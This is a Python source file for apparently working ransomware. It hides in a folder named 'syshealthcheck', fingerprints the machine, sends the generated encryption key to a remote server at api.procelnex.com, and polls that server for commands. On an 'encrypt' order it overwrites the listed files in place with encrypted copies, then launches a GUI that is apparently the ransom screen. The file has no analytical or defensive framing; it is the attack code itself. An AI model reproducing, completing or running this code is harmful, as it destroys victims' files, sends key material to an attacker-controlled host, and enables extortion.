import os
import uuid
import json
import requests
from cryptography.fernet import Fernet
import time
import hashlib
import platform
import base64
from decryption_test import run_decryption
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread
import psutil
from StartUp import main as Setup
# from GUI import launch_gui

# API endpoints
REGISTER_URL = "https://api.procelnex.com/register"
COMMAND_URL = "https://api.procelnex.com/command"

def create_syshealthcheck_folder():
    """Create the syshealthcheck folder in the root directory."""
    platform_system = platform.system()
    if platform_system == "Windows":
        folder_path = "C:\\syshealthcheck"
    elif platform_system in ["Darwin", "Linux"]:  # Darwin is macOS
        folder_path = "/syshealthcheck"
    else:
        raise ValueError("Unsupported platform")

    # Create folder if it doesn't exist
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    return folder_path

# Define syshealthcheck folder and local store paths
syshealth_folder = create_syshealthcheck_folder()
LOCAL_STORE = os.path.join(syshealth_folder, "pending_registration.json")

CHUNK_SIZE = 64 * 1024  # 64KB chunks
MAX_THREADS = 4  # Control how many files encrypt concurrently

# List of files to skip
skip_files = [
    'Commands.py', 'decryption_debug.py', 'test.py', 'encryption_test.py',
    'register_device.py', 'key.txt', 'decryption_test.py', 'pending_registration.json'
]

def is_internet_available():
    try:
        response = requests.get("https://www.google.com", timeout=10)
        return response.status_code == 200
    except (requests.ConnectionError, requests.Timeout, requests.RequestException):
        return False



def store_details_locally(device_id, key):
    """Store device ID and encryption key locally if no internet connection."""
    data = {
        'device_id': device_id,
        'encryption_key': base64.b64encode(key).decode('utf-8')  # Encode key as base64 string
    }

    if os.path.exists(LOCAL_STORE):
        with open(LOCAL_STORE, 'r') as file:
            local_data = json.load(file)
    else:
        local_data = []

    local_data.append(data)

    with open(LOCAL_STORE, 'w') as file:
        json.dump(local_data, file)

def retry_pending_registrations():
    """Retry sending pending device registrations when internet is available."""
    if not os.path.exists(LOCAL_STORE):
        return

    with open(LOCAL_STORE, 'r') as file:
        local_data = json.load(file)

    if not local_data:
        return

    success = []
    for entry in local_data:
        device_id = entry['device_id']
        encryption_key = base64.b64decode(entry['encryption_key'])  # Decode base64 string to bytes
        try:
            register_device(device_id, encryption_key)
            success.append(entry)
        except Exception as e:
            print(f"Failed to register pending device: {str(e)}")

    if success:
        local_data = [entry for entry in local_data if entry not in success]
        with open(LOCAL_STORE, 'w') as file:
            json.dump(local_data, file)

def generate_device_id():
    mac_address = get_mac_address()
    system_info = f"{platform.node()}-{platform.system()}-{platform.release()}"
    unique_string = f"{mac_address}-{system_info}"
    device_id = hashlib.sha256(unique_string.encode()).hexdigest()
    return device_id

def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
        return mac
    except Exception as e:
        print(f"Error getting MAC address: {e}")
        return "00:00:00:00:00:00"

def generate_key():
    return Fernet.generate_key()

def register_device(device_id, key):
    Setup()
    key_base64 = base64.b64encode(key).decode('utf-8')
    data = {'device_id': device_id, 'encryption_key': key_base64}
    response = requests.post(REGISTER_URL, json=data)

    if response.status_code == 200:
        print(f"Device registered successfully: {response.json()}")
    elif response.status_code == 400 and "Client already registered" in response.text:
        print("Device is already registered. Continuing to poll for commands...")
    else:
        print(f"Failed to register device: {response.status_code} {response.text}")
        exit()

def encrypt_file(file_path, key, log_file_path):
    """Encrypts a file if it hasn't been encrypted already."""
    # Check if file is already encrypted
    with open(log_file_path, 'r') as encrypted_log:
        encrypted_files = encrypted_log.readlines()

    if file_path + '\n' in encrypted_files:
        print(f"File already encrypted: {file_path}")
        return

    f = Fernet(key)
    temp_file = file_path + ".enc"
    
    try:
        with open(file_path, "rb") as f_in, open(temp_file, "wb") as f_out:
            while chunk := f_in.read(CHUNK_SIZE):
                encrypted_chunk = f.encrypt(chunk)
                f_out.write(encrypted_chunk)
        os.replace(temp_file, file_path)
        print(f"Encrypted: {file_path}")
        
        # Log the encrypted file in the syshealthcheck folder
        with open(log_file_path, 'a') as log_file:
            log_file.write(f"{file_path}\n")
    
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {str(e)}")

def get_files_to_encrypt_from_file(file_path):
    if not os.path.exists(file_path):
        print(f"{file_path} does not exist.")
        return []
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines() if line.strip()]

def encrypt_files_concurrently(key, log_file_path):
    files_to_encrypt = get_files_to_encrypt_from_file('discovered_files.txt')
    if not files_to_encrypt:
        print("No files to encrypt.")
        return

    # Filter out any files in the syshealthcheck directory
    syshealth_dir = create_syshealthcheck_folder()
    files_to_encrypt = [file for file in files_to_encrypt if not file.startswith(syshealth_dir)]

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(encrypt_file, file, key, log_file_path): file for file in files_to_encrypt}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Error: {str(e)}")

    # After all encryption tasks are done, check if all files have been encrypted
    check_encryption_completion(files_to_encrypt, log_file_path)


def check_encryption_completion(files_to_encrypt, log_file_path):
    """Check if all files in 'discovered_files.txt' have been encrypted."""
    with open(log_file_path, 'r') as encrypted_log:
        encrypted_files = {line.strip() for line in encrypted_log.readlines()}

    unencrypted_files = set(files_to_encrypt) - encrypted_files

    if unencrypted_files:
        print("The following files are still pending encryption:")
        for file in unencrypted_files:
            print(file)
    else:
        print("All files have been successfully encrypted.")
        # You can trigger post-encryption tasks here, such as launching the GUI or other processes
        from GUI import launch_gui
        launch_gui()


def poll_server_for_command(device_id, log_file_path):
    try:
        response = requests.get(f"{COMMAND_URL}/{device_id}")
        print(f"Server Response: {response.text}")  # Add this line to see the raw response
        if response.status_code == 200:
            data = response.json()
            print(f"Received command: {data}")
            if data.get('command') == 'encrypt' and 'encryption_key' in data:
                key = base64.b64decode(data['encryption_key'])
                encrypt_files_concurrently(key, log_file_path)
                
            elif data.get('command') == 'decrypt' and 'encryption_key' in data:
                key = base64.b64decode(data['encryption_key'])
                run_decryption(key)
        else:
            print(f"Failed to poll for commands: {response.status_code} {response.text}")
    except Exception as e:
        print(f"Error polling server: {str(e)}")

def check_encrypted_files(log_file_path):
    """Check encrypted files by comparing 'discovered_files.txt' with the encrypted log file."""    
    if not os.path.exists('discovered_files.txt'):
        print("'discovered_files.txt' does not exist.")
        return
    if not os.path.exists(log_file_path):
        print(f"'{log_file_path}' does not exist.")
        return

    with open('discovered_files.txt', 'r') as discovered_file:
        discovered_files = {line.strip() for line in discovered_file.readlines()}

    with open(log_file_path, 'r') as encrypted_file:
        encrypted_files = {line.strip() for line in encrypted_file.readlines()}

    unencrypted_files = discovered_files - encrypted_files

    if unencrypted_files:
        print("Files pending encryption:")
        for file in unencrypted_files:
            print(file)
    else:
        print("All discovered files have been encrypted.")
        from GUI import launch_gui
        launch_gui()

def monitor_resources():
    while True:
        print(f"Free memory: {psutil.virtual_memory().available / (1024 ** 2):.2f} MB")
        time.sleep(10)

def run_encryption():
    print("Encryption initiated.")
    
    log_file_path = os.path.join(syshealth_folder, 'encrypted_files.txt')  # Log file path inside syshealthcheck
    
    if not os.path.exists(log_file_path):
        open(log_file_path, 'w').close()

    retry_pending_registrations()

    if is_internet_available():
        device_id = generate_device_id()
        key = generate_key()
        with open(os.path.join(syshealth_folder, 'key.txt'), 'wb') as key_file:
            key_file.write(key)
        register_device(device_id, key)
    else:
        print("No internet connection. Storing device details locally.")
        device_id = generate_device_id()
        key = generate_key()
        store_details_locally(device_id, key)

    check_encrypted_files(log_file_path)

    while True:
        print("Polling for commands...")
        poll_server_for_command(device_id, log_file_path)
        time.sleep(10)

